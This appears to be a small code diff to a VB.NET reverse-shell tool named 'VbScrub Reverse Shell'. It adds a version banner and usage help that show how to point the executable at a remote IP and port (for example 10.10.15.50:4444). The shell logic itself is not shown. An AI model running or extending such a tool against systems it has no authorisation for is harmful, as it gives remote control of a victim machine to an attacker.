@@ -8,6 +8,7 @@ Module MainModule
     Sub Main()
         System.Threading.Thread.Sleep(2000)
         Try
+            Console.WriteLine(Environment.NewLine & "VbScrub Reverse Shell v" & My.Application.Info.Version.ToString & Environment.NewLine)
             If My.Application.CommandLineArgs.Count < 2 OrElse My.Application.CommandLineArgs(0) = "/?" Then
                 ShowHelp()
                 Exit Sub
@@ -29,7 +30,10 @@ Module MainModule
     End Sub
 
     Private Sub ShowHelp()
-        Console.WriteLine("Help text not yet implemented. See http://vbscrub.com for more information")
+        Console.WriteLine("USAGE:" & Environment.NewLine &
+                          "  VbRev.exe RemoteIp PortNumber [/debug]" & Environment.NewLine & Environment.NewLine &
+                          "EXAMPLES:" & Environment.NewLine &
+                          "  VbRev.exe 10.10.15.50 4444" & Environment.NewLine)
     End Sub
 
     Private Sub Server_Closed()
